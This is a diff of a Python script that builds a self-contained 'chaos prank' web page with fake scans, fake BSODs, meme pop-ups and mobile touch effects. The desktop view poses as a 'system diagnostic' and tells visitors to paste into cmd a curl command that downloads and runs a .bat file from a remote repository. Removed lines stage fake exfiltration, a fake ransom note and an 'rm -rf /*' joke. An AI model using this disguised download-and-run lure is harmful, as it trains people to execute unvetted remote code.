@@ -2,9 +2,19 @@
 """
 build_web.py
 Compiles index.html with:
-1. Exact mobile device detection: iPhone, iPad, Android Phone, Android Tablet, Desktop
-2. Tailored mobile roasted typewriter terminal with exact pauses and styling
-3. Desktop experience with 1-click Real Terminal (.bat) generation & In-Browser Full Chaos Show
+1. Robust mobile device detection: iPhone, iPad, Android Phone, Android Tablet, mobile viewport
+2. Full interactive Mobile In-Browser Chaos Prank:
+   - Mobile cyber terminal with mobile telemetry & fake exfiltration
+   - Mobile home screen takeover with app icons & dock
+   - Meme cascade & touch-dodging retro virus error cards with sound & haptic vibration
+   - Mobile push notification alert toast
+   - Screen tearing glitch & Mobile BSOD / Kernel Panic with live panic tap counter
+   - Comical failing repair ("bro we're cooked 💀") & AI Personality restore dialogue
+   - Final Dignity Audit roast
+   - 2411 instant abort via keyboard or discreet emergency touch button
+3. Desktop experience:
+   - 1-click terminal command copy box (Windows CMD & macOS/Linux Bash)
+   - Optional In-Browser Simulation fallback
 4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
 """
 
@@ -76,6 +86,7 @@ def build():
     padding: 0;
     -webkit-user-select: none;
     user-select: none;
+    -webkit-touch-callout: none;
   }}
   html, body {{
     width: 100%;
@@ -87,103 +98,98 @@ def build():
     position: fixed;
   }}
 
-  /* Mobile Terminal Container */
-  #mobile-terminal {{
+  /* Mobile Diagnostic Launcher Prompt */
+  #mobile-launcher {{
     display: none;
     width: 100vw;
-    height: 100dvh;
-    padding: 20px 24px;
+    height: 100%;
     background: #040608;
-    overflow-y: hidden;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 24px;
+    z-index: 100;
     position: absolute;
     top: 0;
     left: 0;
-    z-index: 9999;
   }}
-  #mobile-terminal::before {{
-    content: "";
-    position: absolute;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      rgba(0, 0, 0, 0.15),
-      rgba(0, 0, 0, 0.15) 1px,
-      transparent 1px,
-      transparent 2px
-    );
-    pointer-events: none;
-    z-index: 10;
-  }}
-  .term-content {{
+  .mobile-scan-card {{
     width: 100%;
-    max-width: 680px;
-    margin: 0 auto;
-    font-size: clamp(14px, 4vw, 17px);
-    line-height: 1.5;
-    letter-spacing: 0.5px;
-    word-break: break-word;
-    white-space: pre-wrap;
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-start;
-    height: 100%;
-    overflow-y: auto;
-    scrollbar-width: none;
+    max-width: 420px;
+    background: #080d09;
+    border: 2px solid #00e650;
+    padding: 24px 20px;
+    box-shadow: 0 0 35px rgba(0, 230, 80, 0.25);
+    text-align: left;
   }}
-  .term-content::-webkit-scrollbar {{
-    display: none;
-  }}
-  .term-line {{
-    margin-bottom: 3px;
-  }}
-  .term-line.highlight {{
-    color: #ffffff;
-    font-weight: bold;
-  }}
-  .term-line.alert {{
-    color: #ff3232;
-    font-weight: bold;
-  }}
-  .term-line.warning {{
-    color: #ffd228;
-  }}
-  .term-line.dim {{
-    color: #557760;
-  }}
-  .cursor {{
+  .m-badge {{
     display: inline-block;
-    width: 9px;
-    height: 16px;
-    background-color: #00e650;
-    vertical-align: middle;
-    margin-left: 3px;
-    animation: blink 0.8s infinite;
+    background: rgba(0, 230, 80, 0.15);
+    color: #00e650;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 4px 8px;
+    border: 1px solid #00e650;
+    margin-bottom: 14px;
+    letter-spacing: 1px;
   }}
-  @keyframes blink {{
-    0%, 49% {{ opacity: 1; }}
-    50%, 100% {{ opacity: 0; }}
+  .m-title {{
+    font-size: 18px;
+    font-weight: bold;
+    color: #00e650;
+    margin-bottom: 16px;
+    border-bottom: 1px solid #1a3320;
+    padding-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }}
+  .m-row {{
+    font-size: 13px;
+    color: #8bb396;
+    margin-bottom: 8px;
+    line-height: 1.4;
+  }}
+  .m-ok {{ color: #00e650; font-weight: bold; }}
+  .m-warn {{ color: #ffd228; font-weight: bold; }}
+  .m-alert {{ color: #ff4d4d; font-weight: bold; }}
+
+  .m-start-btn {{
+    width: 100%;
+    margin-top: 22px;
+    background: #0f1c14;
+    border: 2px solid #00e650;
+    color: #00e650;
+    padding: 16px 18px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    text-align: center;
+    letter-spacing: 1px;
+    box-shadow: 0 0 15px rgba(0, 230, 80, 0.3);
+    animation: pulseBtn 1.8s infinite;
+  }}
+  @keyframes pulseBtn {{
+    0%, 100% {{ box-shadow: 0 0 15px rgba(0, 230, 80, 0.3); }}
+    50% {{ box-shadow: 0 0 28px rgba(0, 230, 80, 0.7); background: #173020; }}
+  }}
+  .m-hint {{
+    margin-top: 14px;
+    font-size: 11px;
+    color: #557760;
+    line-height: 1.4;
+    text-align: center;
   }}
 
   /* Desktop Container */
-  #desktop-container {{
-    display: none;
-    width: 100vw;
-    height: 100vh;
-    position: relative;
-    background: #040608;
-  }}
-  #desktop-canvas {{
-    width: 100%;
-    height: 100%;
-    display: block;
-  }}
   #desktop-launcher {{
+    display: none;
     position: absolute;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
     width: 640px;
-    max-width: 90%;
+    max-width: 92%;
     background: #0a0e13;
     border: 2px solid #00e650;
     padding: 30px;
@@ -276,43 +282,88 @@ def build():
   .cmd-hint b {{
     color: #00e650;
   }}
+
+  /* Fullscreen Unified Canvas Container */
+  #canvas-container {{
+    display: none;
+    width: 100vw;
+    height: 100%;
+    position: relative;
+    background: #040608;
+  }}
+  #main-canvas {{
+    width: 100%;
+    height: 100%;
+    display: block;
+    touch-action: none;
+  }}
+  #btn-mobile-abort {{
+    display: none;
+    position: fixed;
+    top: 10px;
+    right: 10px;
+    background: rgba(10, 15, 10, 0.7);
+    color: rgba(0, 230, 80, 0.5);
+    border: 1px solid rgba(0, 230, 80, 0.25);
+    font-size: 10px;
+    padding: 4px 8px;
+    border-radius: 4px;
+    z-index: 10000;
+    font-family: monospace;
+    cursor: pointer;
+  }}
 </style>
 </head>
 <body>
 
-<!-- Mobile / Tablet Roaster Terminal -->
-<div id="mobile-terminal">
-  <div class="term-content" id="mobile-content">
-    <div id="typed-lines"></div>
-    <div id="active-line"><span id="current-text"></span><span class="cursor"></span></div>
+<!-- Mobile Diagnostic Scanner Start Prompt -->
+<div id="mobile-launcher">
+  <div class="mobile-scan-card">
+    <div class="m-badge">● LIVE TELEMETRY</div>
+    <div class="m-title">&gt; SYSTEM INTEGRITY SCAN</div>
+    <div class="m-row">&gt; HARDWARE AUDIT: <span class="m-ok" id="m-device-name">[MOBILE DEVICE]</span></div>
+    <div class="m-row">&gt; ENVIRONMENT: <span class="m-warn">AUDIT REQUIRED</span></div>
+    <div class="m-row">&gt; THREAT STATUS: <span class="m-alert">ANALYSIS PENDING</span></div>
+    
+    <button id="btn-start-mobile" class="m-start-btn">
+      &gt; TAP TO START DIAGNOSTIC &lt;
+    </button>
+    <div class="m-hint">&gt; Tap anywhere to verify hardware and display subsystem</div>
   </div>
 </div>
 
-<!-- Desktop Container -->
-<div id="desktop-container">
-  <canvas id="desktop-canvas"></canvas>
+<!-- Desktop Container (Verification / Terminal Command Display) -->
+<div id="desktop-launcher">
+  <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
+  <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
+  <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>
 
-  <!-- Initial Desktop Verification / Terminal Command Display -->
-  <div id="desktop-launcher">
-    <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
-    <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
-    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>
-
-    <!-- OS Selection Tabs -->
-    <div class="os-tabs">
-      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
-      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
-    </div>
-    
-    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" &amp;&amp; "%TEMP%\\launch.bat"</div>
-
-    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>
-
-    <div class="cmd-hint" id="cmd-hint">
-      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
-      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
-    </div>
+  <!-- OS Selection Tabs -->
+  <div class="os-tabs">
+    <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
+    <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
   </div>
+  
+  <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" &amp;&amp; "%TEMP%\\\\launch.bat"</div>
+
+  <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>
+
+  <div class="cmd-hint" id="cmd-hint">
+    &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
+    &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
+  </div>
+
+  <div style="margin-top: 22px; text-align: center;">
+    <button id="btn-run-browser-sim" style="background: transparent; border: 1px dashed #204028; color: #558860; font-size: 11px; padding: 6px 14px; cursor: pointer; border-radius: 4px; font-family: inherit;">
+      [ OR RUN IN-BROWSER SIMULATION ]
+    </button>
+  </div>
+</div>
+
+<!-- Canvas Container -->
+<div id="canvas-container">
+  <canvas id="main-canvas"></canvas>
+  <button id="btn-mobile-abort" title="Emergency Abort Code">2411</button>
 </div>
 
 <script>
@@ -320,283 +371,38 @@ def build():
 const MEME_ASSETS = {memes_json};
 
 /* ==========================================================================
-   DEVICE DETECTION
+   ROBUST DEVICE DETECTION
    ========================================================================== */
-function detectDevice() {{
+function isMobileDevice() {{
   const ua = navigator.userAgent || '';
   const platform = navigator.platform || '';
   const maxTouchPoints = navigator.maxTouchPoints || 0;
 
-  // 1. iPhone / iPod
-  if (/iPhone|iPod/i.test(ua)) {{
-    return 'iphone';
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Silk/i.test(ua)) {{
+    return true;
   }}
-
-  // 2. iPad: checks classic iPad UA or modern iPadOS reporting as MacIntel with multi-touch
-  const isIPadOS = (platform === 'MacIntel' || platform === 'Macintosh') && maxTouchPoints > 1 && !window.MSStream;
-  if (/iPad/i.test(ua) || isIPadOS) {{
-    return 'ipad';
+  if ((platform === 'MacIntel' || platform === 'Macintosh') && maxTouchPoints > 1 && !window.MSStream) {{
+    return true;
   }}
+  if (window.innerWidth <= 820 || (window.screen && window.screen.width <= 820)) {{
+    return true;
+  }}
+  if (window.matchMedia && window.matchMedia("(max-width: 820px) and (hover: none)").matches) {{
+    return true;
+  }}
+  return false;
+}}
 
-  // 3. Android devices
+function getMobileDeviceName() {{
+  const ua = navigator.userAgent || '';
+  if (/iPhone/i.test(ua)) return "Apple iPhone";
+  if (/iPad/i.test(ua)) return "Apple iPad";
   if (/Android/i.test(ua)) {{
-    // Android phones have "Mobile" in user-agent string, tablets do not
-    if (/Mobile/i.test(ua)) {{
-      return 'android-phone';
-    }} else {{
-      return 'android-tablet';
-    }}
+    const match = ua.match(/Android\\s+([0-9\\.]+);\\s*([^;)]+)/i);
+    if (match && match[2]) return match[2].trim();
+    return "Android Device";
   }}
-
-  // 4. Other mobile checks
-  if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {{
-    return 'android-phone';
-  }}
-
-  // 5. Desktop / Laptop
-  return 'desktop';
-}}
-
-/* ==========================================================================
-   MOBILE ROAST SCRIPTS & TYPEWRITER PACING
-   ========================================================================== */
-const IPHONE_SCRIPT = [
-  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
-  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
-  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
-  {{ text: "> DEVICE DETECTED: IPHONE", speed: 25, pause: 800, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> YOU OPENED THIS ON A PHONE? 💀", speed: 38, pause: 1300, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> THIS IS A COMPUTER PRANK.", speed: 35, pause: 850, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> NOT A TIKTOK FILTER.", speed: 30, pause: 400 }},
-  {{ text: "> NOT INSTAGRAM.", speed: 30, pause: 400 }},
-  {{ text: "> NOT A SCREENSHOT.", speed: 30, pause: 600 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> A. COMPUTER.", speed: 50, pause: 1000, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> PROCESSING...", speed: 22, pause: 400 }},
-  {{ text: "> PROCESSING...", speed: 22, pause: 400 }},
-  {{ text: "> PROCESSING...", speed: 22, pause: 700 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> CONCLUSION:", speed: 30, pause: 700, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> YOU PAID ALL THAT MONEY...", speed: 40, pause: 850, warning: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> JUST TO GET EXCLUDED. 😭", speed: 45, pause: 1500, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> MOBILE DEVICE STATUS:", speed: 25, pause: 400, highlight: true }},
-  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ INSUFFICIENT SCREEN", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 30, pause: 650, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ERROR 404:", speed: 30, pause: 300, alert: true }},
-  {{ text: "> COMMON SENSE NOT FOUND.", speed: 35, pause: 850, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> NICE TRY THOUGH.", speed: 35, pause: 750 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> COME BACK WITH A KEYBOARD. 💀", speed: 40, pause: 1200, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 700, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
-];
-
-const IPAD_SCRIPT = [
-  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
-  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
-  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
-  {{ text: "> DEVICE DETECTED: IPAD", speed: 25, pause: 800, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> BIGGER SCREEN.", speed: 40, pause: 850, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> STILL NOT A COMPUTER. 💀", speed: 45, pause: 1400, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> YOU MADE IT BIGGER...", speed: 35, pause: 750 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> BUT YOU STILL DIDN'T BRING A KEYBOARD.", speed: 40, pause: 1200, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TABLET STATUS:", speed: 25, pause: 400, highlight: true }},
-  {{ text: "> ❌ TOO BIG FOR MOBILE", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ TOO SMALL FOR THE SHOW", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 30, pause: 650, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> NICE TRY.", speed: 35, pause: 750 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> COME BACK WITH A REAL COMPUTER. 😭", speed: 40, pause: 1400, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 700, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
-];
-
-const ANDROID_PHONE_SCRIPT = [
-  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
-  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
-  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
-  {{ text: "> DEVICE DETECTED: ANDROID PHONE", speed: 25, pause: 800, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> NICE TRY, NPC. 💀", speed: 40, pause: 1300, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> THIS PRANK REQUIRES A REAL COMPUTER.", speed: 35, pause: 850, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> YOUR PHONE IS NOT READY FOR THIS LEVEL OF CHAOS.", speed: 35, pause: 1200, warning: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "> MOBILE STATUS:", speed: 25, pause: 400, highlight: true }},
-  {{ text: "> ❌ KEYBOARD NOT FOUND", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ DESKTOP MODE NOT FOUND", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 30, pause: 650, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> COME BACK WITH A KEYBOARD.", speed: 35, pause: 850, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> WE'LL PRETEND THIS NEVER HAPPENED. 😭", speed: 40, pause: 1400, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 800, dim: true }}
-];
-
-const ANDROID_TABLET_SCRIPT = [
-  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
-  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
-  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
-  {{ text: "> DEVICE DETECTED: ANDROID TABLET", speed: 25, pause: 800, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ABSOLUTELY NOT.", speed: 45, pause: 900, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> YOU MADE IT BIGGER...", speed: 35, pause: 750 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> BUT YOU STILL DIDN'T MAKE IT A COMPUTER. 💀", speed: 40, pause: 1400, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TABLET STATUS:", speed: 25, pause: 400, highlight: true }},
-  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 25, pause: 350, alert: true }},
-  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 30, pause: 650, alert: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> NICE TRY.", speed: 35, pause: 750 }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> COME BACK WITH A COMPUTER.", speed: 40, pause: 1200, highlight: true }},
-  {{ text: "", pause: 200 }},
-  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 800, dim: true }}
-];
-
-/* ==========================================================================
-   TYPEWRITER ENGINE FOR MOBILE
-   ========================================================================== */
-function runMobileTerminal(script) {{
-  const term = document.getElementById("mobile-terminal");
-  const typedLines = document.getElementById("typed-lines");
-  const currentTextSpan = document.getElementById("current-text");
-  const content = document.getElementById("mobile-content");
-  term.style.display = "block";
-
-  let lineIdx = 0;
-  let charIdx = 0;
-
-  function typeChar() {{
-    if (lineIdx >= script.length) {{
-      return; // Completed, stops mobile prank permanently
-    }}
-
-    const cur = script[lineIdx];
-    const text = cur.text || "";
-
-    if (text.length === 0) {{
-      // Empty blank line
-      const div = document.createElement("div");
-      div.className = "term-line";
-      div.innerHTML = "&nbsp;";
-      typedLines.appendChild(div);
-      lineIdx++;
-      setTimeout(typeChar, cur.pause || 200);
-      return;
-    }}
-
-    if (charIdx < text.length) {{
-      currentTextSpan.textContent = text.substring(0, charIdx + 1);
-      charIdx++;
-      content.scrollTop = content.scrollHeight;
-      setTimeout(typeChar, cur.speed || 25);
-    }} else {{
-      // Finished current line
-      const div = document.createElement("div");
-      div.className = "term-line" +
-        (cur.highlight ? " highlight" : "") +
-        (cur.alert ? " alert" : "") +
-        (cur.warning ? " warning" : "") +
-        (cur.dim ? " dim" : "");
-      div.textContent = text;
-      typedLines.appendChild(div);
-      currentTextSpan.textContent = "";
-      charIdx = 0;
-      lineIdx++;
-      content.scrollTop = content.scrollHeight;
-      setTimeout(typeChar, cur.pause || 400);
-    }}
-  }}
-
-  setTimeout(typeChar, 300);
-}}
-
-/* ==========================================================================
-   DESKTOP REAL TERMINAL BATCH GENERATOR (.BAT)
-   ========================================================================== */
-function triggerRealTerminalDownload() {{
-  const batContent = `@echo off
-chcp 65001 >nul
-title System Diagnostic & Security Tool
-color 0A
-mode con: cols=100 lines=35
-cls
-echo [*] Initializing System Diagnostic Environment...
-cd /d "%TEMP%"
-curl -sL https://github.com/pmkaulani/prank/archive/refs/heads/main.zip -o prank.zip
-tar -xf prank.zip
-cd prank-main
-where python >nul 2>nul
-if %ERRORLEVEL% equ 0 (
-    python chaos_prank.py
-) else (
-    echo [!] Python runtime not detected. Launching visual engine...
-    start index.html
-)
-pause
-`;
-  const blob = new Blob([batContent], {{ type: "application/x-bat" }});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "run_prank.bat";
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  alert("Prank launcher downloaded: 'run_prank.bat'.\\n\\nDouble-click the file to run the prank directly in your REAL Windows terminal!");
+  return "Mobile Device";
 }}
 
 /* ==========================================================================
@@ -611,7 +417,7 @@ class WebSFX {{
       const AudioCtx = window.AudioContext || window.webkitAudioContext;
       this.ctx = new AudioCtx();
     }}
-    if (this.ctx.state === "suspended") {{
+    if (this.ctx && this.ctx.state === "suspended") {{
       this.ctx.resume();
     }}
   }}
@@ -649,19 +455,18 @@ class WebSFX {{
   winError() {{
     this.playTone(180, 480, "sawtooth", 0.6);
   }}
-  winExclamation() {{
-    this.playTone(480, 160, "triangle", 0.45);
-  }}
 }}
 
 /* ==========================================================================
-   IN-BROWSER DESKTOP CHAOS ENGINE (FULL SCREEN PRANK)
+   UNIFIED IN-BROWSER CHAOS ENGINE (MOBILE & DESKTOP)
    ========================================================================== */
 class WebChaosPrank {{
-  constructor(canvas, sfx) {{
+  constructor(canvas, sfx, isMobile = false, deviceLabel = "VICTIM_CLIENT") {{
     this.canvas = canvas;
     this.ctx = canvas.getContext("2d");
     this.sfx = sfx;
+    this.isMobile = isMobile;
+    this.deviceLabel = deviceLabel;
     this.images = [];
     this.sprites = [];
     this.state = "INIT";
@@ -672,7 +477,6 @@ class WebChaosPrank {{
     this.H = window.innerHeight;
     this.totalDeployed = 0;
     this.filledPrimary = 0;
-    this.totalPrimary = 20;
     this.mouseX = -999;
     this.mouseY = -999;
     this.panicCount = 0;
@@ -682,6 +486,7 @@ class WebChaosPrank {{
     this.repairStart = 0;
     this.toastActive = false;
     this.toastDenied = false;
+
     this.resize();
     window.addEventListener("resize", () => this.resize());
     window.addEventListener("keydown", (e) => this.onKey(e));
@@ -689,8 +494,31 @@ class WebChaosPrank {{
       this.mouseX = e.clientX;
       this.mouseY = e.clientY;
     }});
-    window.addEventListener("click", () => {{
-      if (this.state === "BSOD") {{
+    
+    // Touch handlers for mobile
+    const onTouch = (e) => {{
+      if (e.touches && e.touches.length > 0) {{
+        this.mouseX = e.touches[0].clientX;
+        this.mouseY = e.touches[0].clientY;
+        if (this.sfx) this.sfx.init();
+        if (this.state === "BSOD" || this.state === "STARTUP_REPAIR") {{
+          this.panicCount++;
+          if (navigator.vibrate) {{ try {{ navigator.vibrate(50); }} catch(err){{}} }}
+        }}
+        if (this.sprites) {{
+          this.sprites.forEach(s => {{
+            if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
+              this.shakeUntil = performance.now() + 80;
+              if (navigator.vibrate) {{ try {{ navigator.vibrate(60); }} catch(err){{}} }}
+            }}
+          }});
+        }}
+      }}
+    }};
+    this.canvas.addEventListener("touchstart", onTouch, {{ passive: true }});
+    this.canvas.addEventListener("touchmove", onTouch, {{ passive: true }});
+    this.canvas.addEventListener("click", () => {{
+      if (this.state === "BSOD" || this.state === "STARTUP_REPAIR") {{
         this.panicCount++;
       }}
     }});
@@ -742,75 +570,140 @@ class WebChaosPrank {{
     }});
 
     this.state = "BOOT";
-    this.bootLines = [
-      "CONNECTING........",
-      "CONNECTING...............",
-      "",
-      "ACCESSING DISPLAY......",
-      "",
-      "[OK]  DISPLAY FOUND",
-      "[OK]  ADMINISTRATOR ACCESS GRANTED",
-      "[OK]  VICTIM LOCATED",
-      "",
-      "============================================================",
-      "[+] TARGET USER IDENTIFIED: \"P_KAULANI\"",
-      "[+] WORKSTATION: \"DESKTOP-7X4N2\" (Windows 11 Pro 64-bit)",
-      "[+] CPU: AMD Ryzen 9 7950X (OVERHEATING - 94°C)",
-      "[+] INTERNAL NETWORK: 192.168.0.███ | MAC: 00:1A:2B:3C:██:██",
-      "[+] POWER / BATTERY: 4% [PLUG IN IMMEDIATELY OR DIE]",
-      "============================================================",
-      "",
-      "[PRIVILEGE] Current user status: GUEST / PEASANT",
-      "[PRIVILEGE] Escalating to: ADMINISTRATOR... OK",
-      "[PRIVILEGE] Escalating to: SYSTEM NT AUTHORITY... OK",
-      "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS LAPTOP... GRANTED",
-      "",
-      "[CAMERA] Initializing front optical sensor...",
-      "[CAMERA] Human face detected in front of screen.",
-      "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
-      "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
-      "",
-      "Scanning system files...",
-      "  |████████████████████| 100%",
-      "",
-      "Targeting user directories for exfiltration...",
-      "[EXFILTRATE] C:\\Users\\Target\\Desktop\\Final_Project_v2_FINAL.docx .. [ENCRYPTED]",
-      "[EXFILTRATE] C:\\Users\\Target\\Documents\\passwords_dont_open.txt ... [HELD HOSTAGE]",
-      "[EXFILTRATE] C:\\Users\\Target\\Pictures\\childhood_photo.png ....... [UPLOADING]",
-      "[EXFILTRATE] C:\\Users\\Target\\AppData\\Browsing_History_3AM.db ... [EXTRACTED]",
-      "",
-      "============================================================",
-      "ALL YOUR FILES HAVE BEEN ENCRYPTED (AES-9000).",
-      "SEND 500 DOGECOIN TO WALLET: 0xDEAD...BEEF",
-      "...",
-      "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
-      "============================================================",
-      "",
-      "[AV_BATTLE] Windows Defender: DETECTED",
-      "[AV_BATTLE] Deploying weaponized memes against antivirus...",
-      "[AV_BATTLE] Windows Defender: CONFUSED",
-      "[AV_BATTLE] System Firewall: EMOTIONALLY UNAVAILABLE",
-      "[AV_BATTLE] Third-party Antivirus: CRYING IN A CORNER",
-      "[AV_BATTLE] Security status: SURRENDERED",
-      "",
-      "[OPERATOR] Remote terminal session established.",
-      "[OPERATOR] > cd system32",
-      "[OPERATOR] > rm -rf /* ... wait wrong operating system",
-      "[OPERATOR] > what button do I click guys",
-      "[OPERATOR] > sorry first day at the ransomware syndicate",
-      "[ERROR] Remote operator appears to be an intern.",
-      "",
-      "[BEHAVIOR] Monitoring user input and keyboard pressure...",
-      "[BEHAVIOR] Panic level: 37%",
-      "[BEHAVIOR] Panic level: 64%",
-      "[BEHAVIOR] Panic level: [███████████████] 97%",
